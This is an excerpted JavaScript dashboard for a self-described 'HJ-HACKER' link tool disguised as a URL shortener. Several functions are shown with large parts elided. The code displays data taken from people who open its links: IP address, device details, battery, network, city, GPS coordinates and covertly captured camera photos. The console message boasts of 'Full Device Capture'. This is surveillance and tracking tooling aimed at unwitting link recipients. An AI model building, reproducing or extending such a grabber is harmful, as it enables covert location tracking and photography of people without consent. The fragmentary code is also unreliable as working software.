...
async function captureFullDeviceInfo() {
    ...
    if (navigator.getBattery) {
        ...
        } catch(e) { info.battery_level = 'Unknown'; info.battery_charging = false; }
    } else {
...
async function deleteLink(code) {
    try {
        ...
        return true;
    } catch(e) { showToast('Error', 'Delete failed', 'error'); return false; }
}
...
async function shortenUrl() {
    ...
    if (await (await database.ref(`urls/${shortCode}`).get()).exists()) {
        showToast('Error', 'Code already taken', 'error'); return;
    }
    ...
    try {
        ...
        if (socialTitle) { linkData.social_gate_title = socialTitle; linkData.social_gate_url = socialUrl; linkData.social_gate_icon = socialIcon; linkData.social_gate_description = socialDesc; linkData.social_gate_button_text = socialButton; }
...
async function checkCodeExists(code) { return (await database.ref(`urls/${code}`).get()).exists(); }

// ========== DISPLAY FUNCTIONS ==========
function updateDisplay(title, icon, content) {
    document.getElementById('dataDisplayHeader').querySelector('i').className = `fas ${icon}`;
...
async function showLinks() {
    ...
    try {
        ...
        if (links.length === 0) { updateDisplay('YOUR LINKS', 'fa-link', '<div class="empty-data"><i class="fas fa-inbox"></i><p>No links yet</p></div>'); return; }
        
        const html = links.map(l => `
            <div class="data-item">
                <div class="data-item-header"><span class="data-item-code"><i class="fas fa-link"></i> /${l.code}</span><span class="data-item-date"><i class="fas fa-calendar"></i> ${new Date(l.created_at).toLocaleDateString()}</span></div>
                <div class="data-item-url">${l.long_url?.substring(0, 60)}...</div>
                <div class="data-item-stats"><span><i class="fas fa-mouse-pointer"></i> Clicks: ${l.clicks || 0}</span>${l.password ? '<span><i class="fas fa-lock"></i> Password</span>' : ''}${l.capture_camera ? '<span><i class="fas fa-camera"></i> Camera</span>' : ''}</div>
                <div class="data-item-actions">
                    ...
                    <button class="data-btn-sm" onclick="confirmDelete('${l.code}')" style="background:#ff444420"><i class="fas fa-trash"></i> Delete</button>
                </div>
            </div>
        `).join('');
        updateDisplay('YOUR LINKS', 'fa-link', html);
    } catch(e) { updateDisplay('YOUR LINKS', 'fa-exclamation-triangle', '<div class="empty-data"><i class="fas fa-exclamation-triangle"></i><p>Error</p></div>'); }
}
    ...
    try {
        ...
        const html = `
            <div class="stats-grid">
                <div class="stat-card"><div class="stat-value">${totalLinks}</div><div class="stat-label"><i class="fas fa-link"></i> Links</div></div>
                <div class="stat-card"><div class="stat-value">${totalClicks}</div><div class="stat-label"><i class="fas fa-mouse-pointer"></i> Clicks</div></div>
                <div class="stat-card"><div class="stat-value">${totalCamera}</div><div class="stat-label"><i class="fas fa-camera"></i> Photos</div></div>
            </div>
            <div style="margin-top:12px">${linksList.map(c => `<div class="data-item" style="margin-bottom:6px"><div class="data-item-header"><span class="data-item-code">/${c}</span></div><div class="data-item-actions"><button class="data-btn-sm" onclick="viewAnalytics('${c}')">View Data</button><button class="data-btn-sm" onclick="confirmDelete('${c}')" style="background:#ff444420">Delete</button></div></div>`).join('')}</div>
        `;
        updateDisplay('STATISTICS', 'fa-chart-line', html);
    } catch(e) { updateDisplay('STATISTICS', 'fa-exclamation-triangle', '<div class="empty-data"><i class="fas fa-exclamation-triangle"></i><p>Error</p></div>'); }
}
...
async function showRecent() {
    ...
    try {
        ...
        for (const [code] of Object.entries(snapshot.val() || {})) {
            ...
            aSnapshot.forEach(a => {
                const d = a.val();
                all.push({ code, ip: d.ip_address, device: d.device_model || d.os, browser: d.browser, city: d.city, country: d.country, battery: d.battery_level, screen: `${d.screen_width}x${d.screen_height}`, timezone: d.timezone, timestamp: d.created_at, camera: d.captured_image });
            });
        }
        all.sort((a,b) => new Date(b.timestamp) - new Date(a.timestamp));
        const recent = all.slice(0, 20);
        if (recent.length === 0) { updateDisplay('RECENT ACTIVITY', 'fa-history', '<div class="empty-data"><i class="fas fa-clock"></i><p>No activity</p></div>'); return; }
        const html = recent.map(v => `
            <div class="data-item">
                <div class="data-item-header"><span class="data-item-code">/${v.code}</span><span class="data-item-date">${new Date(v.timestamp).toLocaleString()}</span></div>
                <div class="data-item-stats"><span><i class="fas fa-globe"></i> ${v.ip || 'Unknown'}</span><span><i class="fas fa-mobile-alt"></i> ${v.device || 'Unknown'}</span><span><i class="fab fa-${v.browser?.toLowerCase() || 'chrome'}"></i> ${v.browser || 'Unknown'}</span></div>
                <div class="data-item-stats">${v.battery ? `<span><i class="fas fa-battery-full"></i> ${v.battery}</span>` : ''}${v.screen ? `<span><i class="fas fa-desktop"></i> ${v.screen}</span>` : ''}${v.timezone ? `<span><i class="fas fa-clock"></i> ${v.timezone}</span>` : ''}</div>
                ${v.city ? `<div class="data-item-stats"><i class="fas fa-map-marker-alt"></i> ${v.city}${v.country ? `, ${v.country}` : ''}</div>` : ''}
                ${v.camera ? `<div class="data-item-stats" style="color:#00ff41"><i class="fas fa-camera"></i> Photo! <button class="data-btn-sm" onclick="viewPhoto('${v.camera}')">View</button></div>` : ''}
                <div class="data-item-actions"><button class="data-btn-sm" onclick="viewAnalytics('${v.code}')">Full Data</button></div>
            </div>
        `).join('');
        updateDisplay('RECENT ACTIVITY', 'fa-history', html);
    } catch(e) { updateDisplay('RECENT ACTIVITY', 'fa-exclamation-triangle', '<div class="empty-data"><i class="fas fa-exclamation-triangle"></i><p>Error</p></div>'); }
}
...
window.viewAnalytics = async (code) => {
    ...
    try {
        ...
        let html = `<div class="stats-grid"><div class="stat-card"><div class="stat-value">${analytics.length}</div><div class="stat-label">Visitors</div></div><div class="stat-card"><div class="stat-value">${new Set(analytics.map(a=>a.ip_address)).size}</div><div class="stat-label">Unique IPs</div></div></div>`;
        html += `<div style="margin-bottom:12px;padding:8px;background:#00000030;border-radius:8px;"><div style="font-size:0.7rem;">${linkData?.long_url || 'N/A'}</div></div>`;
        
        if (analytics.length === 0) {
            html += '<div class="empty-data"><i class="fas fa-inbox"></i><p>No visitors yet</p></div>';
        } else {
            html += analytics.map(a => `
                <div class="data-item">
                    <div class="data-item-header"><span><i class="fas fa-globe"></i> ${a.ip_address || 'Unknown'}</span><span class="data-item-date">${new Date(a.created_at).toLocaleString()}</span></div>
                    <div class="data-item-stats"><strong>Device:</strong> ${a.device_brand || ''} ${a.device_model || a.os || 'Unknown'}</div>
                    <div class="data-item-stats"><strong>Browser:</strong> ${a.browser || 'Unknown'} | <strong>OS:</strong> ${a.os || 'Unknown'} ${a.os_version ? `(v${a.os_version})` : ''}</div>
                    <div class="data-item-stats"><strong>Battery:</strong> ${a.battery_level || 'Unknown'} ${a.battery_charging === true ? '(Charging)' : ''}</div>
                    <div class="data-item-stats"><strong>RAM:</strong> ${a.device_memory || 'Unknown'} | <strong>Network:</strong> ${a.connection_type?.toUpperCase() || 'Unknown'}</div>
                    <div class="data-item-stats"><strong>Screen:</strong> ${a.screen_width || '?'}x${a.screen_height || '?'} | <strong>Language:</strong> ${a.language || 'Unknown'}</div>
                    <div class="data-item-stats"><strong>Timezone:</strong> ${a.timezone || 'Unknown'} | <strong>Orientation:</strong> ${a.orientation || 'Unknown'}</div>
                    ${a.city ? `<div class="data-item-stats"><strong>Location:</strong> ${a.city}${a.country ? `, ${a.country}` : ''}</div>` : ''}
                    ${a.latitude ? `<div class="data-item-stats"><strong>GPS:</strong> ${a.latitude}, ${a.longitude}</div>` : ''}
                    ${a.captured_image ? `<div class="data-item-stats" style="color:#00ff41"><i class="fas fa-camera"></i> Photo! <button class="data-btn-sm" onclick="viewPhoto('${a.captured_image}')">View</button></div>` : ''}
                </div>
            `).join('');
        }
        updateDisplay(`ANALYTICS: /${code}`, 'fa-chart-line', html);
    } catch(e) { updateDisplay('ERROR', 'fa-exclamation-triangle', '<div class="empty-data"><i class="fas fa-exclamation-triangle"></i><p>Error</p></div>'); }
};

window.copyToClipboard = (text) => { navigator.clipboard.writeText(text); showToast('Copied', 'Link copied!', 'success'); };
window.viewPhoto = (img) => { document.getElementById('photoModalImage').src = img; document.getElementById('photoModal').classList.remove('hidden'); };
...
function downloadPhoto() { const img = document.getElementById('photoModalImage'); if(img.src) { const a = document.createElement('a'); a.download = 'photo.jpg'; a.href = img.src; a.click(); showToast('Success', 'Photo downloaded!', 'success'); } }
...
document.querySelectorAll('.bottom-nav-btn').forEach(btn => {
    btn.addEventListener('click', () => {
        ...
        if (tab === 'create') { document.getElementById('createCard').scrollIntoView({ behavior: 'smooth' }); updateDisplay('Click any button', 'fa-fingerprint', '<div class="empty-data"><i class="fas fa-fingerprint"></i><p>Tap LINKS, STATS, or RECENT</p></div>'); }
...
document.getElementById('passwordToggle')?.addEventListener('change', e => document.getElementById('passwordSection').classList.toggle('hidden'));
document.getElementById('socialToggle')?.addEventListener('change', e => document.getElementById('socialSection').classList.toggle('hidden'));
...
document.getElementById('copyBtn')?.addEventListener('click', () => copyToClipboard(document.getElementById('shortLink')?.textContent));
...
showLinks(); showStats(); showRecent();
console.log('🔥 HJ-HACKER Loaded with Full Device Capture!');
